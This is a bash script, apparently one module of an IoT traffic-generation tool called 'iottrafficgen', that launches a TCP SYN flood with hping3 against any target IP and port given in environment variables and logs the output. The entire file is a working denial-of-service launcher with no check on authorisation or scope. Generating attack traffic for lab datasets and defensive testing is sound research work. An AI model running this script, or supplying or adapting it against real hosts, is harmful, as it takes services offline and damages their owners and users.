#!/usr/bin/env bash
set -euo pipefail

: "${TARGET_IP:?TARGET_IP is required}"
: "${TARGET_PORT:?TARGET_PORT is required}"

TOOL_ARGS="${TOOL_ARGS:-}"
RUN_ID="${RUN_ID:-run_unknown}"
OUT_DIR="${OUT_DIR:-runs/${RUN_ID}/syn_flood}"

mkdir -p "$OUT_DIR"

echo "[syn_flood] TARGET=${TARGET_IP}:${TARGET_PORT}"
echo "[syn_flood] TOOL_ARGS=${TOOL_ARGS}"
echo "[syn_flood] OUT_DIR=${OUT_DIR}"

if ! command -v hping3 &>/dev/null; then
    echo "[syn_flood] ERROR: hping3 not found in PATH"
    echo "[syn_flood] Install: apt install hping3 or brew install hping3"
    exit 1
fi

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "[syn_flood] WARNING: hping3 requires root privileges"
    echo "[syn_flood] Run with: sudo iottrafficgen ..."
fi

read -r -a ARGS <<< "$TOOL_ARGS"

OUTPUT_FILE="${OUT_DIR}/hping3_output.txt"

printf '[syn_flood] CMD: hping3 %q' "$TARGET_IP"
printf ' -p %q --syn' "$TARGET_PORT"
for a in "${ARGS[@]}"; do printf ' %q' "$a"; done
printf ' > %q 2>&1\n' "$OUTPUT_FILE"

echo "[syn_flood] Starting SYN flood attack..."
echo "[syn_flood] Press Ctrl+C to stop"

set +e
hping3 "$TARGET_IP" \
    -p "$TARGET_PORT" \
    --syn \
    "${ARGS[@]}" \
    -V > "$OUTPUT_FILE" 2>&1 &

HPING_PID=$!
echo "[syn_flood] hping3 PID: $HPING_PID"

wait $HPING_PID
EXIT_CODE=$?
set -e

echo "[syn_flood] hping3 exit code: $EXIT_CODE"

if [[ -f "$OUTPUT_FILE" ]]; then
    echo "[syn_flood] Output saved to: $OUTPUT_FILE"
    OUT_LINES=$(wc -l < "$OUTPUT_FILE" 2>/dev/null || echo "0")
    echo "[syn_flood] Output lines: $OUT_LINES"
else
    echo "[syn_flood] WARNING: No output file generated"
fi

echo "[syn_flood] Completed"
exit $EXIT_CODE
